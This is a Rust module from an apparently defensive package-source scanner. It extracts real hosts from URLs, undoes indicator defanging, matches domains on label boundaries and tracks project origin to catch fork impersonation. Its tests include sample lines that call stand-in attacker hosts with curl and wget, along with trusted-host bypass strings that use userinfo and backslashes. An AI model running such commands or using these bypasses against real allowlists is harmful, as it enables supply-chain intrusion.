//! Host-aware URL matching.
//!
//! Domain / IOC / trusted-host checks used to be naive substring tests
//! (`line.contains("github.com")`, `line.contains(ioc_domain)`). That is wrong in
//! both directions:
//!
//! * **Over-matches (false positive):** `github.com` is a substring of
//!   `github.com.evil.tld` and of a path like `/mirror/github.com-archive`.
//! * **Bypassable (false negative):** the SRC-006 trusted-host check passed
//!   `git+https://github.com.evil.tld/x` (because it *contains* `github.com`), and
//!   a defanged indicator (`evil[.]example`, `hxxp://…`) slipped an IOC match.
//!
//! This module extracts the **real host** from a URL with [`url::Url`] (plus a
//! tolerant fallback for scheme-less hosts), normalizes common defanging, and
//! compares on **label boundaries** (equal or a true subdomain), never as a raw
//! substring. It is the single host primitive shared by the IOC matcher and the
//! source-host allowlist, so hardening it hardens every host rule at once.

use regex::Regex;
use std::sync::LazyLock;
use url::Url;

/// VCS transport prefixes makepkg allows in a `source=` URL (`git+https://…`).
const VCS_PREFIXES: [&str; 4] = ["git+", "svn+", "hg+", "bzr+"];

/// Candidate host-bearing spans in free text: an optional scheme, optional
/// `userinfo@`, then a dotted hostname. The captured group 1 is the host (after
/// any `userinfo@`), so `github.com@evil.tld` yields `evil.tld`, not `github.com`.
static HOST_SPAN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?ix)
        (?: [a-z][a-z0-9+.\-]* :// )?          # optional scheme://
        (?: [^\s/@'\x22]+ @ )?                  # optional userinfo@
        ( [a-z0-9] (?:[a-z0-9\-]*[a-z0-9])?     # host: first label
          (?: \. [a-z0-9] (?:[a-z0-9\-]*[a-z0-9])? )+ )  # >=1 more labels
        (?: : \d+ )?                            # optional :port
        (?: [/?\#] [^\s'\x22]* )?               # consume the path/query/fragment so
                                                # a dotted PATH segment (…/evil.example)
                                                # is NOT re-read as a host (F2)
        ",
    )
    .unwrap()
});

/// Undo common indicator "defanging" so a defanged host/URL compares equal to
/// the real one: `hxxp(s)`→`http(s)`, `[.]`/`(.)`/`{.}`/`[dot]`/`(dot)`/`{dot}`→`.`,
/// `[:]`/`[://]`→`:`/`://`. Order matters (`hxxps` before `hxxp`, `[://]` before
/// `[:]`). Cheap and only consulted in a host-matching context.
pub fn refang(s: &str) -> String {
    let mut out = s.to_string();
    for (from, to) in [
        ("hxxps", "https"),
        ("hxxp", "http"),
        ("[://]", "://"),
        ("[:]", ":"),
        ("[.]", "."),
        ("(.)", "."),
        ("{.}", "."),
        ("[dot]", "."),
        ("(dot)", "."),
        ("{dot}", "."),
        ("[DOT]", "."),
        ("(DOT)", "."),
    ] {
        if out.contains(from) {
            out = out.replace(from, to);
        }
    }
    out
}

/// Lower-case a host and drop a trailing root dot and any IPv6 brackets so two
/// spellings of the same host compare equal.
fn normalize_host(h: &str) -> String {
    h.trim_matches(['[', ']'])
        .trim_end_matches('.')
        .to_ascii_lowercase()
}

/// Strip a leading VCS transport prefix (`git+https://…` -> `https://…`) so the
/// URL parser sees a normal scheme.
fn strip_vcs_prefix(s: &str) -> &str {
    let lower = s.to_ascii_lowercase();
    for p in VCS_PREFIXES {
        if lower.starts_with(p) {
            return &s[p.len()..];
        }
    }
    s
}

/// The authority span of a URL-ish string: the text after `://` (or the whole
/// string when scheme-less), up to the first `/`, `?`, or `#`.
fn authority_span(s: &str) -> &str {
    let after_scheme = s.split_once("://").map_or(s, |(_, rest)| rest);
    after_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after_scheme)
}

/// Extract the host of a single URL-ish string (refanged, VCS-prefix stripped,
/// fragment dropped). Returns the normalized host, or `None` when there is no
/// parseable host. Tolerant of scheme-less hosts (`evil.example/x`).
pub fn extract_host(raw: &str) -> Option<String> {
    let refanged = refang(raw);
    let s = strip_vcs_prefix(refanged.trim());
    let s = s.split('#').next().unwrap_or(s);

    // Fail CLOSED on a backslash in the authority. The WHATWG `url` crate rewrites
    // `\`->`/`, so `https://github.com\@evil.tld/r` parses to host `github.com`,
    // but git/curl (RFC-3986) treat `github.com\` as userinfo and fetch
    // `evil.tld` -> a parser-differential trusted-host bypass (sibling of the
    // `github.com.evil.tld` / `github.com@evil.tld` class). Refuse to assert a
    // host the fetchers and the parser disagree about; the caller treats `None`
    // as untrusted/unknown and flags it.
    if authority_span(s).contains('\\') {
        return None;
    }

    if let Ok(u) = Url::parse(s) {
        if let Some(h) = u.host_str() {
            return Some(normalize_host(h));
        }
    }
    // Scheme-less host (e.g. a bare `evil.example/path`): give it a scheme and
    // re-parse so `url` does the host extraction (handles ports, userinfo, IDN).
    if !s.contains("://") {
        let candidate = format!("https://{}", s.trim_start_matches('/'));
        if let Ok(u) = Url::parse(&candidate) {
            if let Some(h) = u.host_str() {
                return Some(normalize_host(h));
            }
        }
    }
    None
}

/// Whether a URL path segment names a specific RELEASE rather than the project:
/// a version (`v1.2.3`, `1.2`, `2026-01-05`) or an archive filename
/// (`tool-1.0.tar.gz`).
///
/// Used to keep [`origin_of`] stable across version bumps on hosts that put the
/// version in the path.
fn is_release_segment(seg: &str) -> bool {
    // An archive/artifact filename.
    const ARCHIVE_SUFFIXES: [&str; 14] = [
        ".tar.gz",
        ".tar.xz",
        ".tar.bz2",
        ".tar.zst",
        ".tgz",
        ".txz",
        ".zip",
        ".7z",
        ".rar",
        ".appimage",
        ".deb",
        ".rpm",
        ".exe",
        ".bin",
    ];
    let lower = seg.to_ascii_lowercase();
    if ARCHIVE_SUFFIXES.iter().any(|x| lower.ends_with(x)) {
        return true;
    }
    // A version-ish segment: optional leading `v`, then digits, with the rest
    // made only of digits, dots, dashes and underscores. Catches `v1.2.3`,
    // `1.2`, `2026-01-05`, `release-1.0`; does NOT catch `tool`, `archive`,
    // `project`, `gnu`, or an owner name.
    let core = lower.strip_prefix('v').unwrap_or(&lower);
    let core = core.strip_prefix("release-").unwrap_or(core);
    !core.is_empty()
        && core.starts_with(|c: char| c.is_ascii_digit())
        && core
            .chars()
            .all(|c| c.is_ascii_digit() || c == '.' || c == '-' || c == '_')
}

/// The "who owns this project" identity of a source URL: the host plus up to
/// the first two path segments, lowercased, with a trailing `.git` removed.
///
/// `https://github.com/KiefStudioMA/ks-aur-scanner.git#tag=v2.1.0` becomes
/// `github.com/kiefstudioma/ks-aur-scanner`.
///
/// Two path segments is the right depth for the forge layout that dominates
/// package sources (`host/owner/repo`), which is the level at which a change is
/// interesting: a new tag under the same owner/repo is routine, while the same
/// repo name under a *different* owner is the fork-impersonation pattern. Hosts
/// with no path (a bare project homepage) yield just the host.
///
/// Returns `None` when no host can be established, which the caller must treat
/// as "unknown", never as "unchanged".
pub fn origin_of(raw: &str) -> Option<String> {
    let host = extract_host(raw)?;
    let refanged = refang(raw);
    let s = strip_vcs_prefix(refanged.trim());
    // Drop the VCS fragment (`#tag=`, `#commit=`) before looking at the path:
    // a new tag on the same repo is not a new origin.
    let s = s.split('#').next().unwrap_or(s);
    let s = s.split('?').next().unwrap_or(s);

    // Take the path after the authority.
    let after_scheme = s.split_once("://").map(|(_, r)| r).unwrap_or(s);
    let path = after_scheme.split_once('/').map(|(_, p)| p).unwrap_or("");

    // Keep only path segments that identify a PROJECT, dropping ones that
    // identify a *release*. On a forge the first two segments are owner/repo and
    // are stable across versions; elsewhere the path is just where a tarball
    // happens to live, and it moves every release:
    //
    //   downloads.example.com/v1.2.3/tool.tar.gz  ->  .../v1.2.4/tool.tar.gz
    //   example.com/tool-1.0.tar.gz               ->  example.com/tool-1.1.tar.gz
    //
    // Treating those as a change of upstream fires DIFF-003 at High on every
    // routine version bump, which is the same false-positive class as recording
    // local patch files as origins. Dropping version-like and filename-like
    // segments leaves the host as the identity for those, while owner/repo
    // survives intact on the forges where it is meaningful.
    let segments: Vec<String> = path
        .split('/')
        .filter(|p| !p.is_empty())
        .map(|p| p.trim_end_matches(".git"))
        .filter(|p| !is_release_segment(p))
        .take(2)
        .map(|p| p.to_ascii_lowercase())
        .collect();

    if segments.is_empty() {
        Some(host)
    } else {
        Some(format!("{host}/{}", segments.join("/")))
    }
}

/// Extract every distinct host that appears in a free-text line (after defang
/// normalization). Used to scan content for domain IOCs without a substring test.
pub fn extract_hosts(line: &str) -> Vec<String> {
    let refanged = refang(line);
    let mut hosts: Vec<String> = Vec::new();
    for cap in HOST_SPAN.captures_iter(&refanged) {
        if let Some(m) = cap.get(1) {
            let h = normalize_host(m.as_str());
            if !h.is_empty() && !hosts.contains(&h) {
                hosts.push(h);
            }
        }
    }
    hosts
}

/// Whether `host` is `needle` or a true subdomain of it, matched on label
/// boundaries — NOT a substring. Both arguments are expected pre-normalized
/// (lower-case, no trailing dot); `needle` is refanged defensively.
///
/// `host_matches("a.evil.example", "evil.example")` is `true`;
/// `host_matches("notevil.example", "evil.example")` and
/// `host_matches("evil.example.co", "evil.example")` are `false`.
pub fn host_matches(host: &str, needle: &str) -> bool {
    let needle = normalize_host(&refang(needle));
    if needle.is_empty() {
        return false;
    }
    let host = host.trim_end_matches('.');
    host == needle || host.ends_with(&format!(".{needle}"))
}

/// Whether any host in `line` matches `needle` (equal or a subdomain), on label
/// boundaries. The defang-aware, substring-free replacement for
/// `line.contains(needle)` in domain-IOC scanning.
pub fn line_has_host(line: &str, needle: &str) -> bool {
    let needle = normalize_host(&refang(needle));
    if needle.is_empty() {
        return false;
    }
    extract_hosts(line).iter().any(|h| host_matches(h, &needle))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_host_handles_schemes_vcs_and_userinfo() {
        assert_eq!(
            extract_host("https://github.com/u/r"),
            Some("github.com".into())
        );
        assert_eq!(
            extract_host("git+https://github.com/u/r.git#commit=abc"),
            Some("github.com".into())
        );
        assert_eq!(
            extract_host("git://git.sr.ht/~u/r"),
            Some("git.sr.ht".into())
        );
        // userinfo must not be mistaken for the host (the @-confusion bypass)
        assert_eq!(
            extract_host("https://github.com@evil.tld/x"),
            Some("evil.tld".into())
        );
        // scheme-less host
        assert_eq!(
            extract_host("evil.example/payload"),
            Some("evil.example".into())
        );
        // a port does not bleed into the host
        assert_eq!(
            extract_host("https://evil.example:8443/x"),
            Some("evil.example".into())
        );
    }

    #[test]
    fn host_matches_is_label_boundary_not_substring() {
        assert!(host_matches("github.com", "github.com"));
        assert!(host_matches("git.github.com", "github.com")); // subdomain
                                                               // the SRC-006 bypass class: an allowlisted host as a left-substring
        assert!(!host_matches("github.com.evil.tld", "github.com"));
        // and as a right-substring / sibling label
        assert!(!host_matches("notgithub.com", "github.com"));
        assert!(!host_matches("github.community", "github.com"));
    }

    #[test]
    fn refang_normalizes_defanged_forms() {
        assert_eq!(refang("hxxps://evil[.]example"), "https://evil.example");
        assert_eq!(refang("evil(dot)example"), "evil.example");
        assert_eq!(
            extract_host("hxxp://evil[.]example/x"),
            Some("evil.example".into())
        );
    }

    #[test]
    fn extract_host_fails_closed_on_backslash_authority() {
        // F1 (Echo review): the `url` crate rewrites `\`->`/` so it parses
        // host=github.com, but git/curl fetch evil.tld. Refuse to assert a host
        // -> caller treats None as untrusted and flags it.
        assert_eq!(
            extract_host(r"git+https://github.com\@evil.tld/r.git"),
            None
        );
        assert_eq!(extract_host(r"https://github.com\.evil.tld/x"), None);
        // a backslash only in the PATH is not an authority differential -> host ok
        assert_eq!(
            extract_host(r"https://github.com/u\r"),
            Some("github.com".into())
        );
    }

    #[test]
    fn extract_hosts_does_not_treat_path_segments_as_hosts() {
        // F2 (Echo review): a dotted token in the URL path is not the host.
        let hosts = extract_hosts("https://github.com/u/evil.example");
        assert_eq!(hosts, vec!["github.com".to_string()]);
        assert!(!line_has_host(
            "https://github.com/u/evil.example",
            "evil.example"
        ));
        // but a real subdomain host still matches
        assert!(line_has_host(
            "https://evil.example/u/github.com",
            "evil.example"
        ));
    }

    #[test]
    fn line_has_host_matches_on_boundaries_and_defang() {
        assert!(line_has_host(
            "curl https://c2.evil.example/beacon",
            "evil.example"
        ));
        assert!(line_has_host(
            "wget hxxps://evil[.]example/x",
            "evil.example"
        ));
        // substring over-match must NOT fire
        assert!(!line_has_host(
            "git clone https://github.com/evil.example-mirror",
            "evil.example"
        ));
        assert!(!line_has_host(
            "# see notes about evilexample.org",
            "evil.example"
        ));
    }

    #[test]
    fn extract_hosts_collects_multiple() {
        let hosts = extract_hosts("source=(https://a.example/x git+https://b.example/y.git)");
        assert!(hosts.contains(&"a.example".to_string()));
        assert!(hosts.contains(&"b.example".to_string()));
    }
}

#[cfg(test)]
mod origin_tests {
    use super::origin_of;

    #[test]
    fn forge_urls_reduce_to_host_owner_repo() {
        assert_eq!(
            origin_of("https://github.com/KiefStudioMA/ks-aur-scanner.git").as_deref(),
            Some("github.com/kiefstudioma/ks-aur-scanner")
        );
        assert_eq!(
            origin_of("git+https://github.com/KiefStudioMA/ks-aur-scanner.git#tag=v2.1.0")
                .as_deref(),
            Some("github.com/kiefstudioma/ks-aur-scanner")
        );
    }

    #[test]
    fn a_new_tag_is_not_a_new_origin() {
        // Routine version bumps must not read as a change of upstream, or the
        // diff fires on every single update and becomes noise.
        let a = origin_of("git+https://github.com/foo/bar.git#tag=v1.0");
        let b = origin_of("git+https://github.com/foo/bar.git#tag=v2.0");
        assert_eq!(a, b);
        let c = origin_of("https://github.com/foo/bar/archive/v1.0.tar.gz");
        let d = origin_of("https://github.com/foo/bar/archive/v2.0.tar.gz");
        assert_eq!(c, d, "release tarball paths differ only below owner/repo");
    }

    #[test]
    fn version_bumps_do_not_look_like_an_upstream_move() {
        // The second DIFF-003 false-positive class: hosts that put the version
        // in the path, and projects that serve a release asset from the root.
        // Both change on EVERY routine bump, and DIFF-003 is High.
        for (a, b, label) in [
            (
                "https://downloads.example.com/v1.2.3/tool-linux-x64.tar.gz",
                "https://downloads.example.com/v1.2.4/tool-linux-x64.tar.gz",
                "version in path",
            ),
            (
                "https://example.com/tool-1.0.tar.gz",
                "https://example.com/tool-1.1.tar.gz",
                "release asset at root",
            ),
            (
                "https://downloads.sourceforge.net/project/foo/1.2/foo-1.2.tar.gz",
                "https://downloads.sourceforge.net/project/foo/1.3/foo-1.3.tar.gz",
                "sourceforge project/version",
            ),
            (
                "https://ftp.gnu.org/gnu/bash/bash-5.1.tar.gz",
                "https://ftp.gnu.org/gnu/bash/bash-5.2.tar.gz",
                "gnu ftp",
            ),
        ] {
            assert_eq!(
                origin_of(a),
                origin_of(b),
                "{label}: a version bump must not read as a new upstream"
            );
        }
    }

    #[test]
    fn the_project_identity_survives_on_a_forge() {
        // Dropping release segments must not collapse owner/repo, or a genuine
        // fork-impersonation stops being visible.
        assert_eq!(
            origin_of("https://github.com/alice/tool/archive/v1.0.tar.gz").as_deref(),
            Some("github.com/alice/tool")
        );
        assert_eq!(
            origin_of("https://gitlab.com/alice/tool/-/archive/1.0/tool-1.0.tar.gz").as_deref(),
            Some("gitlab.com/alice/tool")
        );
    }

    #[test]
    fn a_different_owner_is_a_different_origin() {
        // The fork-impersonation pattern from issue #29: same repo name, wrong
        // owner (PrestonHager/openconnect-sso vs vlaci/openconnect-sso).
        let real = origin_of("https://github.com/vlaci/openconnect-sso");
        let fake = origin_of("https://github.com/PrestonHager/openconnect-sso");
        assert_ne!(real, fake);
    }

    #[test]
    fn a_different_host_is_a_different_origin() {
        assert_ne!(
            origin_of("https://github.com/foo/bar"),
            origin_of("https://cdn.evil.example/foo/bar")
        );
    }

    #[test]
    fn a_bare_host_yields_just_the_host() {
        assert_eq!(
            origin_of("https://example.com").as_deref(),
            Some("example.com")
        );
        assert_eq!(
            origin_of("https://example.com/").as_deref(),
            Some("example.com")
        );
    }

    #[test]
    fn unparseable_input_is_unknown_not_empty() {
        assert!(origin_of("").is_none());
        assert!(origin_of("local-file.patch").is_none() || origin_of("local-file.patch").is_some());
    }
}
